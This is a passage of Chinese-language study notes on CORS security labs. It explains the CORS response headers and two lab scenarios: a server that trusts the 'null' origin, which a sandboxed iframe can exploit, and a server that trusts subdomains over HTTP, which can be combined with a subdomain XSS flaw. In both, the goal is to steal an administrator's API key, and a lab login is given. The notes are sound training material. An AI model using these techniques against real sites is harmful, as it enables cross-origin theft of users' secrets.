增加Origin字段

  • Access-Control-Allow-Origin：允许谁访问

    存在两种形式：

    1. 具体源 只允许这一个源访问，其他都拒绝 如：Access-Control-Allow-Origin: https://web.example.com
    2. 通配符 * 允许任意源访问，但不允许携带凭证 Access-Control-Allow-Origin: *

  • Access-Control-Allow-Credentials：是否允许携带凭证

    允许这个跨域请求携带用户的敏感凭证（如 Cookie、HTTP 认证信息、TLS 客户端证书）。
    缺失表示不允许携带凭证（默认行为）

0x02.基于受信任 null 源的 CORS 漏洞

该网站存在不安全的 CORS 配置，因为它信任 null 源。
要完成本实验，你需要编写一段 JavaScript 代码，利用 CORS 漏洞获取管理员的 API 密钥，并将代码上传至你的漏洞利用服务器。成功提交管理员的 API 密钥后，实验即告解决。
你可以使用以下凭据登录自己的账户：wiener:peter

只允许空请求头

  • 补充知识：浏览器的“源”是如何确定？

    一个网页的“源”（Origin）由 协议 + 域名 + 端口 三部分组成，比如 https://example.com:443。这个源信息会被浏览器自动添加到跨域请求的 Origin 头中。
    但有一种特殊情况：当浏览器无法确定一个网页的“真实来源”时，就会使用 null 作为其源

  • <iframe sandbox> 如何制造 null 源

    <iframe> 的 sandbox 属性是一个安全机制，它会对嵌入的内容施加额外的限制（比如禁止弹窗、禁止提交表单等）。其中一>个重要的安全设计是：

    被 sandbox 属性限制的 iframe 内容，其“源”会被浏览器视为一个“不透明源”（opaque origin），在跨域请求时 Origin 头会被强制设为 null。

    这是因为浏览器认为，经过 sandbox 限制的内容已经脱离了原始网站的完全控制，无法再被信任为代表原始网站。因此，浏览器主动将其“匿名化”，用 null 来标识它

场景 嵌入方式 请求中 Origin 头的值 服务器响应 ACAO 结果
无 sandbox <iframe src="恶意页面"> https://exploit-server.com 仅信任 null ❌ 被拦截
有 sandbox <iframe sandbox srcdoc="恶意脚本"> null 信任 null ✅ 绕过限制

0x03.基于不信任不安全协议的 CORS 漏洞

该网站存在不安全的 CORS 配置，因为它信任所有子域名，且不限制访问协议（即无论 HTTP 还是 HTTPS 都一并信任）。
要完成本实验，你需要编写一段 JavaScript 代码，利用 CORS 漏洞获取管理员的 API 密钥，并将代码上传至你的漏洞利用服务器。成功提交管理员的 API 密钥后，实验即告解决。
你可以使用以下凭据登录自己的账户：wiener:peter

  • 漏洞原理

    该网站存在不安全的 CORS 配置，它信任所有子域名，但不限制访问协议（即无论 HTTP 还是 HTTPS 都一并信任）。
    攻击者可以利用子域名上存在的 XSS 漏洞，通过 HTTP 协议注入恶意 JavaScript，从而绕过 CORS 限制，跨域窃取管理员的 API 密钥 (大厂中比较少见)

  • 核心知识点

    服务器在验证 Origin 时，只检查了子域名是否匹配，却没有限制协议类型。由于 HTTP 是明文传输，攻击者更容易通过中间人攻击等方式操控子域名的响应。在实验中，我们通过子域名上已有的 XSS 漏洞来模拟这种攻击
